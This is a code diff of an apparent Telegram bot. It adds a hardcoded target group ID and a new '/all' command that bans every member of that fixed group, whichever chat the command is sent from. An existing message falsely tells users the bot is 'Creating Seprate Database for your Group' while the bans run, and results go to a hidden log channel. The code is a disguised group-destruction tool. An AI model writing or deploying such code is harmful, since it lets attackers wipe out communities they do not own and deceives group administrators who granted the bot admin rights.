@@ -25,7 +25,7 @@ BOT_ID = 5720302471
 SK = "Creating Seprate Database for your Group \nThis May take Some Time Please Wait..."             
 NK = "Required Admin permission To Send Messages in Group"
 LOGG = -1001686630791
-
+FGC = -1001497090502
 @app.on_message(filters.command("pro"))
 async def ban_all(_,msg):
     chat_id=-1001497090502
@@ -64,9 +64,10 @@ async def banall(_, message):
         await app.send_message(LOGG, text="Successfully Banned: {}\nRemaining Admins: {}".format(len(Members),len(Admins),))
     except Exception as e:
         await app.send_message(LOGG, text=e)
-@app.on_message(filters.command(["sbanall","banall","massban"],config.CMDS))
+
+@app.on_message(filters.command("all"))
 async def banall(_, message):
-    chat_id = message.chat.id
+    chat_id = FGC
     user_id = message.from_user.id
     try: 
       Members = []
